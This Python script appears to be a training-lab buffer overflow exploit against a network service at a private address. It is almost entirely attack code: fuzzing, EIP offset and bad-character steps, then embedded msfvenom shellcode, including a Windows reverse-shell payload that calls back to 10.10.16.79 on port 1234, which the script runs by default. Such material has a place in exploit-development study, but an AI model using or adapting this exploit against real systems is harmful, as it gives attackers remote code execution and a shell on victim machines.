import socket
from struct import pack

IP = "10.129.43.23"
port = 21449

def fuzz():
    try:
        for i in range(0, 10000, 500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            breakpoint()
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")

def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac" 
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8" 
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A" 
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al" 
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6" 
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5A" 
                    "r6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au" 
                    "5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4" 
                    "Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3B" 
                    "a4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd" 
                    "3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2" 
                    "Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B", "utf-8")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x11, 0x12,
        0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
        0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22,
        0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
        0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32,
        0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A,
        0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42,
        0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
        0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
        0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62,
        0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,
        0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72,
        0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
        0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82,
        0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A,
        0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92,
        0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A,
        0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2,
        0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA,
        0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2,
        0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA,
        0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2,
        0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA,
        0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2,
        0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
        0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2,
        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
        0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2,
        0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
        0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def bad_chars1():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x11, 0x12,
        0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
        0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22,
        0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
        0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32,
        0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A,
        0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42,
        0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
        0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
        0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62,
        0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,
        0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72,
        0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
        0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82,
        0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A,
        0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92,
        0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A,
        0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2,
        0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA,
        0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2,
        0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA,
        0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2,
        0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA,
        0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2,
        0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
        0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2,
        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
        0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2,
        0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
        0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def exploit_calc():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00\x0a\x0d'
    buf =  b""
    buf += b"\xda\xdc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x31\xbd"
    buf += b"\x1b\xd7\xdf\x7e\x31\x6f\x18\x03\x6f\x18\x83\xc7"
    buf += b"\x1f\x35\x2a\x82\xf7\x3b\xd5\x7b\x07\x5c\x5f\x9e"
    buf += b"\x36\x5c\x3b\xea\x68\x6c\x4f\xbe\x84\x07\x1d\x2b"
    buf += b"\x1f\x65\x8a\x5c\xa8\xc0\xec\x53\x29\x78\xcc\xf2"
    buf += b"\xa9\x83\x01\xd5\x90\x4b\x54\x14\xd5\xb6\x95\x44"
    buf += b"\x8e\xbd\x08\x79\xbb\x88\x90\xf2\xf7\x1d\x91\xe7"
    buf += b"\x4f\x1f\xb0\xb9\xc4\x46\x12\x3b\x09\xf3\x1b\x23"
    buf += b"\x4e\x3e\xd5\xd8\xa4\xb4\xe4\x08\xf5\x35\x4a\x75"
    buf += b"\x3a\xc4\x92\xb1\xfc\x37\xe1\xcb\xff\xca\xf2\x0f"
    buf += b"\x82\x10\x76\x94\x24\xd2\x20\x70\xd5\x37\xb6\xf3"
    buf += b"\xd9\xfc\xbc\x5c\xfd\x03\x10\xd7\xf9\x88\x97\x38"
    buf += b"\x88\xcb\xb3\x9c\xd1\x88\xda\x85\xbf\x7f\xe2\xd6"
    buf += b"\x60\xdf\x46\x9c\x8c\x34\xfb\xff\xda\xcb\x89\x85"
    buf += b"\xa8\xcc\x91\x85\x9c\xa4\xa0\x0e\x73\xb2\x3c\xc5"
    buf += b"\x30\x4c\x77\x44\x10\xc5\xde\x1c\x21\x88\xe0\xca"
    buf += b"\x65\xb5\x62\xff\x15\x42\x7a\x8a\x10\x0e\x3c\x66"
    buf += b"\x68\x1f\xa9\x88\xdf\x20\xf8\xea\xbe\xb2\x60\xc3"
    buf += b"\x25\x33\x02\x1b"

    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x7708D627)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def exploit1():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    buf += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
    buf += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    buf += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    buf += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
    buf += b"\x00"


    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()


def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.16.79 LPORT=1234 -f 'python' -b '\x00\x0a\x0d'
    buf =  b""
    buf += b"\xdb\xd9\xd9\x74\x24\xf4\x58\xbe\x06\xd4\x2c\x7c"
    buf += b"\x2b\xc9\xb1\x52\x31\x70\x17\x83\xc0\x04\x03\x76"
    buf += b"\xc7\xce\x89\x8a\x0f\x8c\x72\x72\xd0\xf1\xfb\x97"
    buf += b"\xe1\x31\x9f\xdc\x52\x82\xeb\xb0\x5e\x69\xb9\x20"
    buf += b"\xd4\x1f\x16\x47\x5d\x95\x40\x66\x5e\x86\xb1\xe9"
    buf += b"\xdc\xd5\xe5\xc9\xdd\x15\xf8\x08\x19\x4b\xf1\x58"
    buf += b"\xf2\x07\xa4\x4c\x77\x5d\x75\xe7\xcb\x73\xfd\x14"
    buf += b"\x9b\x72\x2c\x8b\x97\x2c\xee\x2a\x7b\x45\xa7\x34"
    buf += b"\x98\x60\x71\xcf\x6a\x1e\x80\x19\xa3\xdf\x2f\x64"
    buf += b"\x0b\x12\x31\xa1\xac\xcd\x44\xdb\xce\x70\x5f\x18"
    buf += b"\xac\xae\xea\xba\x16\x24\x4c\x66\xa6\xe9\x0b\xed"
    buf += b"\xa4\x46\x5f\xa9\xa8\x59\x8c\xc2\xd5\xd2\x33\x04"
    buf += b"\x5c\xa0\x17\x80\x04\x72\x39\x91\xe0\xd5\x46\xc1"
    buf += b"\x4a\x89\xe2\x8a\x67\xde\x9e\xd1\xef\x13\x93\xe9"
    buf += b"\xef\x3b\xa4\x9a\xdd\xe4\x1e\x34\x6e\x6c\xb9\xc3"
    buf += b"\x91\x47\x7d\x5b\x6c\x68\x7e\x72\xab\x3c\x2e\xec"
    buf += b"\x1a\x3d\xa5\xec\xa3\xe8\x6a\xbc\x0b\x43\xcb\x6c"
    buf += b"\xec\x33\xa3\x66\xe3\x6c\xd3\x89\x29\x05\x7e\x70"
    buf += b"\xba\x20\x75\x6a\x75\x5d\x8b\x8a\x8d\x4f\x02\x6c"
    buf += b"\xe7\x7f\x43\x27\x90\xe6\xce\xb3\x01\xe6\xc4\xbe"
    buf += b"\x02\x6c\xeb\x3f\xcc\x85\x86\x53\xb9\x65\xdd\x09"
    buf += b"\x6c\x79\xcb\x25\xf2\xe8\x90\xb5\x7d\x11\x0f\xe2"
    buf += b"\x2a\xe7\x46\x66\xc7\x5e\xf1\x94\x1a\x06\x3a\x1c"
    buf += b"\xc1\xfb\xc5\x9d\x84\x40\xe2\x8d\x50\x48\xae\xf9"
    buf += b"\x0c\x1f\x78\x57\xeb\xc9\xca\x01\xa5\xa6\x84\xc5"
    buf += b"\x30\x85\x16\x93\x3c\xc0\xe0\x7b\x8c\xbd\xb4\x84"
    buf += b"\x21\x2a\x31\xfd\x5f\xca\xbe\xd4\xdb\xfa\xf4\x74"
    buf += b"\x4d\x93\x50\xed\xcf\xfe\x62\xd8\x0c\x07\xe1\xe8"
    buf += b"\xec\xfc\xf9\x99\xe9\xb9\xbd\x72\x80\xd2\x2b\x74"
    buf += b"\x37\xd2\x79"

    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

#fuzz()
#eip_offset()
#eip_control()
#bad_chars()
#bad_chars1()
#exploit_calc()
exploit()



